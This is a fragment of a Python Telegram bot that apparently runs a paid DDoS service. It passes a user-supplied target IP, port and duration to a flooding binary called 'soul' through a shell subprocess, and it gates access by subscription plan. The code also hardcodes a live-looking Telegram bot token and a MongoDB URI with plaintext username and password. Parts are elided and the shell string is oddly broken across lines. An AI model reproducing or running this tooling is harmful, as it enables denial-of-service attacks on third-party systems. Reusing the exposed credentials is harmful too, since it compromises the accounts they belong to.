...
TOKEN = '7283606759:AAHsFEQGI50beuYQN1kTICJyum9xGcHdotY'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002446070214
CHANNEL_ID = -1002446070214
error_channel_id = -1002446070214
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"



soul {target_ip} {target_port} {duration} 10")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @p1derman.*", parse_mode='Markdown')  # Contact owner message
            return
